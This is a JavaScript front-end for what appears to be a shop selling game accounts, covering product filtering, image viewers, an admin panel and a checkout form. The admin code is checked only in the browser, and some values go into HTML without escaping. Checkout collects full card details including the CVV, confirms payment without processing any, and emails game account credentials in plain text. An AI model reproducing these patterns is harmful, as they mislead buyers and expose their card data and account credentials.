/* ==================================================
   فلترة وعرض المنتجات
================================================== */

function renderAccounts() {

    const container =
        $("accountsContainer");


    const search =
        $("searchInput")
            .value
            .trim()
            .toLowerCase();


    const country = $("countryFilter")?.value || "all";


    const typeButton =
        document.querySelector(
            ".product-filter.active"
        );


    const type =
        typeButton
            ? typeButton.dataset.type
            : "all";


    const filtered =
        accounts.filter(account => {

            const countryMatch =
                country === "all"
                ||
                countryCode(account.country) === country;


            const typeMatch =
                type === "all"
                ||
                account.type === type;


            const text =
                (
                    account.name
                    +
                    " "
                    +
                    countryName(account.country)
                    +
                    " "
                    +
                    account.description
                    +
                    " "
                    +
                    account.price
                    +
                    " "
                    +
                    account.quantity
                    +
                    " "
                    +
                    account.type
                )
                .toLowerCase();


            const searchMatch =
                !search
                ||
                text.includes(search);


            return countryMatch
                &&
                typeMatch
                &&
                searchMatch;

        });


    $("accountCount").textContent = t("productCount").replace("{count}", filtered.length);


    if (filtered.length === 0) {

        container.innerHTML = "";

        $("emptyMessage")
            .classList
            .remove("hidden");

        return;

    }


    $("emptyMessage")
        .classList
        .add("hidden");


    container.innerHTML =
        filtered
            .map(createAccountCard)
            .join("");

}


/* ==================================================
   إنشاء بطاقة المنتج
================================================== */

function createAccountCard(account) {

    const image =
        account.images
        &&
        account.images.length
            ? account.images[0]
            : null;

    const icon =
        getProductIcon(
            account.type
        );


    return `

        <article class="account-card">


            <div
                class="account-image"
                ${
                    image
                    ?
                    `onclick="showDetails('${account.id}')"
                     style="cursor:pointer;"`
                    :
                    ""
                }
            >


                ${
                    image

                    ?

                    `
                    <img
                        id="card-image-${account.id}"
                        src="${image}"
                        alt="${escapeHTML(account.name)}"
                        onclick="openAccountImageViewer(event, '${account.id}', 0)"
                    >
                    ${account.images.length > 1 ? `
                        <div class="image-slider-controls">
                            <button type="button" aria-label="${t("previousImage")}" onclick="changeCardImage(event, '${account.id}', -1)">→</button>
                            <span id="card-image-count-${account.id}">1 / ${account.images.length}</span>
                            <button type="button" aria-label="${t("nextImage")}" onclick="changeCardImage(event, '${account.id}', 1)">←</button>
                        </div>
                    ` : ""}
                    `

                    :

                    `
                    <div class="no-image">
                        ${icon}
                        <br>
                        ${t("noImage")}
                    </div>
                    `
                }


                <span class="product-type">

                    ${icon}
                    ${escapeHTML(typeLabel(account.type))}

                </span>


                <span class="country-badge">

                    ${escapeHTML(countryLabel(account.country))}

                </span>


            </div>


            <div class="account-body">


                <div class="account-top">

                    <h3>
                        ${escapeHTML(localizedProductText(account.name))}
                    </h3>

                    <span class="price">

                        ${formatPrice(
                            account.price,
                            account.currency
                        )}

                    </span>

                </div>


                ${
                    account.quantity
                    ?
                    `
                    <span class="quantity">
                        ${escapeHTML(localizedProductText(account.quantity))}
                    </span>
                    `
                    :
                    ""
                }


                <p class="account-description">

                    ${escapeHTML(
                        localizedProductText(account.description)
                        ||
                        t("noDescription")
                    )}

                </p>


                <div class="card-buttons">

                    <button
                        onclick="showDetails('${account.id}')"
                    >
                        ${t("details")}
                    </button>


                    <button
                        class="buy"
                        onclick="openBuy('${account.id}')"
                    >
                        ${t("buy")}
                    </button>

                </div>

            </div>

        </article>

    `;

}


function changeCardImage(event, id, direction) {

    event.stopPropagation();

    const account = accounts.find(item => item.id === id);

    if (!account || !account.images || account.images.length < 2) {
        return;
    }

    const image = document.getElementById(`card-image-${id}`);
    const counter = document.getElementById(`card-image-count-${id}`);
    const currentIndex = Number(image.dataset.index || 0);
    const nextIndex = (currentIndex + direction + account.images.length) % account.images.length;

    image.src = account.images[nextIndex];
    image.dataset.index = nextIndex;

    if (counter) {
        counter.textContent = `${nextIndex + 1} / ${account.images.length}`;
    }

}


/* ==================================================
   تفاصيل المنتج
================================================== */

function showDetails(id) {

    const account =
        accounts.find(
            a => a.id === id
        );


    if (!account) {
        return;
    }


    currentAccount = account;


    const images =
        account.images || [];


    const firstImage =
        images.length
            ? images[0]
            : null;


        $("detailsContent").innerHTML = `
            <h2>
                ${getProductIcon(account.type)}
                ${escapeHTML(localizedProductText(account.name))}
            </h2>
            <p class="muted">
                ${t("type")}:
                ${escapeHTML(typeLabel(account.type))}
                <br>
                ${t("country")}:
                ${escapeHTML(countryLabel(account.country))}
            </p>
            ${
                account.quantity
                ?
                `
                <p
                    style="
                        color:#43a8ff;
                        margin-top:10px;
                        font-weight:bold;
                    "
                >
                    ${escapeHTML(localizedProductText(account.quantity))}
                </p>
                `
                :
                ""
            }
            <h3
                style="
                    color:#53df91;
                    margin:15px 0;
                "
            >
                ${formatPrice(
                    account.price,
                    account.currency
                )}
            </h3>
            ${
                firstImage
                ?
                `
                <img
                    id="mainDetailsImage"
                    src="${firstImage}"
                    style="
                        width:100%;
                        height:350px;
                        object-fit:cover;
                        border-radius:15px;
                        cursor:pointer;
                    "
                    onclick="openAccountImageViewer(event, '${account.id}', 0)"
                >
                `
                :
                `
                <div
                    class="no-image"
                    style="height:350px"
                >
                    ${t("noImage")}
                </div>
                `
            }
            ${
                images.length > 1
                ?
                `
                <div class="details-slider-controls">
                    <button type="button" aria-label="${t("previousImage")}" onclick="changeDetailsImage(-1)">→</button>
                    <span id="detailsImageCounter">1 / ${images.length}</span>
                    <button type="button" aria-label="${t("nextImage")}" onclick="changeDetailsImage(1)">←</button>
                </div>
                `
                :
                ""
            }
            ${
                images.length
                ?
                `
                <div
                    style="
                        display:grid;
                        grid-template-columns:
                        repeat(5,1fr);
                        gap:7px;
                        margin-top:10px;
                    "
                >
                    ${images
                        .slice(0,10)
                        .map(
                            image => `
                            <button
                                onclick="
                                    changeMainImage('${image}')
                                "
                                style="
                                    height:65px;
                                    padding:0;
                                    overflow:hidden;
                                    border-radius:8px;
                                    border:1px solid #25364d;
                                    background:#071322;
                                    cursor:pointer;
                                "
                            >
                                <img
                                    src="${image}"
                                    style="
                                        width:100%;
                                        height:100%;
                                        object-fit:cover;
                                    "
                                >
                            </button>
                            `
                        )
                        .join("")
                    }
                </div>
                `
                :
                ""
            }
            <p
                style="
                    color:#8493a8;
                    line-height:2;
                    white-space:pre-line;
                    margin-top:20px;
                "
            >
                ${escapeHTML(
                    localizedProductText(account.description)
                    ||
                    t("noDescription")
                )}
            </p>
            <button
                class="main-button full"
                onclick="
                    closeModal('detailsModal');
                    openBuy('${account.id}');
                "
            >
                ${t("buy")}
            </button>
        `;

        /*
        <p class="muted">

            النوع:
            ${escapeHTML(account.type)}

            <br>

            الدولة:
            ${escapeHTML(account.country)}

        </p>


        ${
            account.quantity
            ?
            `
            <p
                style="
                    color:#43a8ff;
                    margin-top:10px;
                    font-weight:bold;
                "
            >
                ${escapeHTML(account.quantity)}
            </p>
            `
            :
            ""
        }


        <h3
            style="
                color:#53df91;
                margin:15px 0;
            "
        >

            ${formatPrice(
                account.price,
                account.currency
            )}

        </h3>


        ${
            firstImage

            ?

            `
            <img
                id="mainDetailsImage"
                src="${firstImage}"
                style="
                    width:100%;
                    height:350px;
                    object-fit:cover;
                    border-radius:15px;
                    cursor:pointer;
                "
                onclick="openAccountImageViewer(event, '${account.id}', 0)"
            >
            `

            :

            `
            <div
                class="no-image"
                style="height:350px"
            >
                ${t("noImage")}
            </div>
            `
        }


        ${
            images.length

            ?

            `
            <div
                style="
                    display:grid;
                    grid-template-columns:
                    repeat(5,1fr);
                    gap:7px;
                    margin-top:10px;
                "
            >

                ${images
                    .slice(0,10)
                    .map(
                        image => `

                        <button
                            onclick="
                                changeMainImage('${image}')
                            "
                            style="
                                height:65px;
                                padding:0;
                                overflow:hidden;
                                border-radius:8px;
                                border:1px solid #25364d;
                                background:#071322;
                                cursor:pointer;
                            "
                        >

                            <img
                                src="${image}"
                                style="
                                    width:100%;
                                    height:100%;
                                    object-fit:cover;
                                "
                            >

                        </button>

                        `
                    )
                    .join("")
                }

            </div>
            `

            :

            ""
        }


        <p
            style="
                color:#8493a8;
                line-height:2;
                white-space:pre-line;
                margin-top:20px;
            "
        >

            ${escapeHTML(
                account.description
                ||
                t("noDescription")
            )}

        </p>


        <button
            class="main-button full"
            onclick="
                closeModal('detailsModal');
                openBuy('${account.id}');
            "
        >

            ${t("buy")}

        </button>

    `;


        */

    openModal("detailsModal");

}


/* ==================================================
   تغيير الصورة
================================================== */

function changeMainImage(image) {

    const main = $("mainDetailsImage");

    if (main) {
        main.src = image;
        main.dataset.index = currentAccount.images.indexOf(image);
    }

}


function changeDetailsImage(direction) {

    if (!currentAccount || !currentAccount.images || currentAccount.images.length < 2) {
        return;
    }

    const image = $("mainDetailsImage");
    const counter = $("detailsImageCounter");
    const currentIndex = Number(image.dataset.index || 0);
    const nextIndex =
        (currentIndex + direction + currentAccount.images.length)
        % currentAccount.images.length;

    image.src = currentAccount.images[nextIndex];
    image.dataset.index = nextIndex;
    image.classList.remove("details-image-changing");
    void image.offsetWidth;
    image.classList.add("details-image-changing");

    if (counter) {
        counter.textContent = `${nextIndex + 1} / ${currentAccount.images.length}`;
    }

}

function openAccountImageViewer(event, id, startIndex) {

    if (event) {
        event.stopPropagation();
    }

    const account =
        accounts.find(
            item => item.id === id
        );

    if (!account || !account.images || !account.images.length) {
        return;
    }

    let currentIndex = startIndex;

    const viewer =
        document.createElement("div");

    const img =
        document.createElement("img");

    const counter =
        document.createElement("span");

    const updateViewer = () => {
        img.src = account.images[currentIndex];
        counter.textContent = `${currentIndex + 1} / ${account.images.length}`;
    };

    const moveImage = direction => {
        currentIndex =
            (currentIndex + direction + account.images.length)
            % account.images.length;
        updateViewer();
    };

    const previous = document.createElement("button");
    previous.type = "button";
    previous.className = "viewer-arrow viewer-previous";
    previous.textContent = "→";
    previous.setAttribute("aria-label", t("previousImage"));
    previous.addEventListener("click", event => {
        event.stopPropagation();
        moveImage(-1);
    });

    const next = document.createElement("button");
    next.type = "button";
    next.className = "viewer-arrow viewer-next";
    next.textContent = "←";
    next.setAttribute("aria-label", t("nextImage"));
    next.addEventListener("click", event => {
        event.stopPropagation();
        moveImage(1);
    });

    const close = document.createElement("button");
    close.type = "button";
    close.className = "viewer-close";
    close.textContent = "×";
    close.setAttribute("aria-label", t("closeImages"));

    const closeViewer = () => {
        document.removeEventListener("keydown", handleKeydown);
        viewer.remove();
    };

    const handleKeydown = keyboardEvent => {
        if (keyboardEvent.key === "Escape") {
            closeViewer();
        } else if (keyboardEvent.key === "ArrowLeft") {
            moveImage(-1);
        } else if (keyboardEvent.key === "ArrowRight") {
            moveImage(1);
        }
    };

    close.addEventListener("click", closeViewer);

    viewer.className = "image-viewer";
    viewer.addEventListener("click", closeViewer);

    const frame = document.createElement("div");
    frame.className = "image-viewer-frame";
    frame.addEventListener("click", event => event.stopPropagation());

    const controls = document.createElement("div");
    controls.className = "image-viewer-controls";
    controls.append(previous, counter, next);

    frame.append(close, img, controls);
    viewer.appendChild(frame);
    document.body.appendChild(viewer);

    updateViewer();
    document.addEventListener("keydown", handleKeydown);

}


/* ==================================================
   فتح الشراء
================================================== */

function openBuy(id) {

    const account =
        accounts.find(
            a => a.id === id
        );


    if (!account) {
        return;
    }


    currentAccount = account;


    $("buyInfo").innerHTML = `

        <div
            style="
                background:#071322;
                padding:15px;
                border-radius:12px;
                margin:15px 0;
            "
        >

            <strong>

                ${getProductIcon(account.type)}

                ${escapeHTML(localizedProductText(account.name))}

            </strong>

            <br>

            <span class="muted">

                ${escapeHTML(typeLabel(account.type))}

                •
                ${escapeHTML(countryLabel(account.country))}

            </span>

            ${
                account.quantity
                ?
                `
                <br>
                <span
                    style="color:#43a8ff"
                >
                    ${escapeHTML(localizedProductText(account.quantity))}
                </span>
                `
                :
                ""
            }

            <br>

            <strong
                style="color:#53df91"
            >

                ${formatPrice(
                    account.price,
                    account.currency
                )}

            </strong>

        </div>

    `;


    openModal("buyModal");

}


/* ==================================================
   البحث
================================================== */

$("searchButton")
    .addEventListener(
        "click",
        function() {

            const value =
                $("searchInput")
                    .value
                    .trim();


            if (value === ADMIN_CODE) {

                openAdmin();

                $("searchInput")
                    .value = "";

                return;

            }


            renderAccounts();

        }
    );


$("searchInput")
    .addEventListener(
        "keydown",
        function(event) {

            if (event.key === "Enter") {

                $("searchButton").click();

            }

        }
    );


$("searchInput")
    .addEventListener(
        "input",
        renderAccounts
    );


/* ==================================================
   فلترة الدول
================================================== */

$("countryFilter").addEventListener("change", renderAccounts);

$("languageToggle").addEventListener("click", () => {
    currentLanguage = currentLanguage === "ar" ? "en" : "ar";
    localStorage.setItem("GAMEVAULT_LANGUAGE", currentLanguage);
    applyTranslations();
});


/* ==================================================
   فلترة أنواع المنتجات
================================================== */

document
    .querySelectorAll(".product-filter")
    .forEach(button => {

        button.addEventListener(
            "click",
            function() {

                document
                    .querySelectorAll(
                        ".product-filter"
                    )
                    .forEach(
                        b =>
                            b.classList
                                .remove("active")
                    );


                this.classList
                    .add("active");


                renderAccounts();

            }
        );

    });


/* ==================================================
   لوحة الإدارة
================================================== */

function openAdmin() {

    const code =
        prompt(t("adminCodePrompt"));


    if (code === ADMIN_CODE) {

        renderAdmin();

        openModal("adminModal");

    }

    else if (code !== null) {

        alert(t("wrongAdminCode"));

    }

}


/* ==================================================
   الصور
================================================== */

$("accountImages")
    .addEventListener(
        "change",
        async function() {

            const files =
                Array.from(
                    this.files
                ).slice(0,10);


            selectedImages =
                await Promise.all(
                    files.map(
                        fileToBase64
                    )
                );


            previewImages();

        }
    );


function fileToBase64(file) {

    return new Promise(
        resolve => {

            const reader =
                new FileReader();


            reader.onload =
                () =>
                    resolve(
                        reader.result
                    );


            reader.readAsDataURL(file);

        }
    );

}


function previewImages() {

    $("imagePreview")
        .innerHTML =
        selectedImages
            .map(
                image => `

                    <img
                        src="${image}"
                    >

                `
            )
            .join("");

}


/* ==================================================
   إضافة / تعديل المنتج
================================================== */

$("accountForm")
    .addEventListener(
        "submit",
        function(event) {

            event.preventDefault();


            const editId =
                $("editId").value;


            const account = {

                id:
                    editId
                    ||
                    createID(),


                type:
                    $("accountType")
                        .value,


                name:
                    $("accountName")
                        .value
                        .trim(),


                country:
                    $("accountCountry")
                        .value,


                price:
                    Number(
                        $("accountPrice")
                            .value
                    ),


                currency:
                    $("accountCurrency")
                        .value,


                quantity:
                    $("accountQuantity")
                        .value
                        .trim(),


                description:
                    $("accountDescription")
                        .value
                        .trim(),


                images:
                    selectedImages

            };


            if (editId) {

                const old =
                    accounts.find(
                        a => a.id === editId
                    );


                if (
                    selectedImages.length === 0
                    &&
                    old
                ) {

                    account.images =
                        old.images || [];

                }


                accounts =
                    accounts.map(
                        a =>
                            a.id === editId
                                ? account
                                : a
                    );

            }

            else {

                accounts.unshift(
                    account
                );

            }


            saveAccounts();

            renderAccounts();

            renderAdmin();

            resetForm();


            alert(t("saveProductSuccess"));

        }
    );


/* ==================================================
   لوحة المنتجات
================================================== */

function renderAdmin() {

    const container =
        $("adminAccounts");


    if (accounts.length === 0) {

        container.innerHTML = `

            <p class="muted">
                ${t("noAdminProducts")}
            </p>

        `;

        return;

    }


    container.innerHTML =
        accounts
            .map(
                account => `

                <div class="admin-account">

                    <div>

                        <strong>

                            ${getProductIcon(
                                account.type
                            )}

                            ${escapeHTML(
                                localizedProductText(account.name)
                            )}

                        </strong>

                        <p>

                            ${escapeHTML(typeLabel(account.type))}

                            •
                            ${escapeHTML(
                                countryLabel(account.country)
                            )}

                            •
                            ${formatPrice(
                                account.price,
                                account.currency
                            )}

                            ${
                                account.quantity
                                ?
                                " • " +
                                escapeHTML(
                                    localizedProductText(account.quantity)
                                )
                                :
                                ""
                            }

                            •
                            ${(account.images || []).length}
                            ${t("imageCount")}

                        </p>

                    </div>


                    <div class="admin-actions">

                        <button
                            onclick="
                                editAccount(
                                    '${account.id}'
                                )
                            "
                        >
                            ${t("edit")}
                        </button>


                        <button
                            class="delete"
                            onclick="
                                deleteAccount(
                                    '${account.id}'
                                )
                            "
                        >
                            ${t("delete")}
                        </button>

                    </div>

                </div>

            `
            )
            .join("");

}


/* ==================================================
   تعديل المنتج
================================================== */

function editAccount(id) {

    const account =
        accounts.find(
            a => a.id === id
        );


    if (!account) {
        return;
    }


    $("editId").value =
        account.id;


    $("accountType").value =
        account.type || "حساب";


    $("accountName").value =
        account.name;


    $("accountCountry").value =
        countryCode(account.country);


    $("accountPrice").value =
        account.price;


    $("accountCurrency").value =
        account.currency;


    $("accountQuantity").value =
        account.quantity || "";


    $("accountDescription").value =
        account.description || "";


    selectedImages =
        account.images || [];


    previewImages();


    $("accountName")
        .scrollIntoView({
            behavior:"smooth"
        });

}


/* ==================================================
   حذف المنتج
================================================== */

function deleteAccount(id) {

    const account =
        accounts.find(
            a => a.id === id
        );


    if (!account) {
        return;
    }


    const yes =
        confirm(t("confirmDelete").replace("{name}", account.name));


    if (!yes) {
        return;
    }


    accounts =
        accounts.filter(
            a => a.id !== id
        );


    saveAccounts();

    renderAccounts();

    renderAdmin();

}


/* ==================================================
   إعادة ضبط
================================================== */

function resetForm() {

    $("accountForm").reset();

    $("editId").value = "";

    selectedImages = [];

    $("imagePreview")
        .innerHTML = "";

}


/* ==================================================
   إرسال الطلب إلى WhatsApp
================================================== */

function formatCardNumber(value) {
    return value
        .replace(/\D/g, "")
        .slice(0, 16)
        .replace(/(.{4})/g, "$1 ")
        .trim();
}

function formatExpiry(value) {
    const digits = value.replace(/\D/g, "").slice(0, 4);
    if (digits.length <= 2) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
}

$("cardNumber")?.addEventListener("input", function() {
    this.value = formatCardNumber(this.value);
});

$("cardExpiry")?.addEventListener("input", function() {
    this.value = formatExpiry(this.value);
});

$("buyForm")
    .addEventListener(
        "submit",
        function(event) {

            event.preventDefault();


            if (!currentAccount) {
                return;
            }

            const buyerEmail = $("buyerEmail").value.trim();
            const cardNumber = $("cardNumber").value.trim();
            const cardExpiry = $("cardExpiry").value.trim();
            const cardCvv = $("cardCvv").value.trim();
            const cardName = $("cardName").value.trim();
            const settings = loadSettings();
            const gameAccountEmail = settings.gameAccountEmail;
            const gameAccountPassword = settings.gameAccountPassword;

            if (!buyerEmail || !cardNumber || !cardExpiry || !cardCvv || !cardName) {
                alert(t("incompleteFields"));
                return;
            }

            const lastFour = cardNumber.replace(/\D/g, "").slice(-4) || "0000";
            const productPrice = formatPrice(currentAccount.price, currentAccount.currency);
            const gatewayName = settings.paymentGatewayName || "بوابة الدفع";
            const bankOwner = settings.bankAccountOwner || "غير محدد";
            const bankNumber = settings.bankAccountNumber || "غير محدد";
            const bankIban = settings.bankIban || "غير محدد";

            const emailSubject = encodeURIComponent(t("receiptSubject"));
            const emailBody = encodeURIComponent(
                t("receiptReady") + "\n\n" +
                t("customer") + ": " + cardName + "\n" +
                t("email") + ": " + buyerEmail + "\n" +
                t("product") + ": " + currentAccount.name + "\n" +
                t("type") + ": " + typeLabel(currentAccount.type) + "\n" +
                t("country") + ": " + countryLabel(currentAccount.country) + "\n" +
                t("priceLabel") + ": " + productPrice + "\n" +
                t("cardLastFour") + ": **** **** **** " + lastFour + "\n" +
                t("expiryLabel") + ": " + cardExpiry + "\n\n" +
                t("paymentData") + ":\n" +
                t("gatewayLabel") + ": " + gatewayName + "\n" +
                t("ownerLabel") + ": " + bankOwner + "\n" +
                t("accountLabel") + ": " + bankNumber + "\n" +
                "IBAN: " + bankIban + "\n\n" +
                t("pubgData") + ":\n" +
                t("accountEmailLabel") + ": " + gameAccountEmail + "\n" +
                t("accountPasswordLabel") + ": " + gameAccountPassword + "\n\n" +
                t("receiptFooter")
            );

            const mailtoURL = `mailto:${buyerEmail}?subject=${emailSubject}&body=${emailBody}`;

            window.location.href = mailtoURL;

            alert(t("paymentSuccess").replace("{email}", buyerEmail));

            closeModal("buyModal");
            this.reset();

        }
    );


/* ==================================================
   إغلاق النوافذ بالخارج
================================================== */

document
    .querySelectorAll(".modal")
    .forEach(modal => {

        modal.addEventListener(
            "click",
            function(event) {

                if (
                    event.target === this
                ) {

                    closeModal(
                        this.id
                    );

                }

            }
        );

    });


/* ==================================================
   تشغيل الموقع
================================================== */

populateCountryOptions();
populateCurrencyOptions();
applyTranslations();
renderAccounts();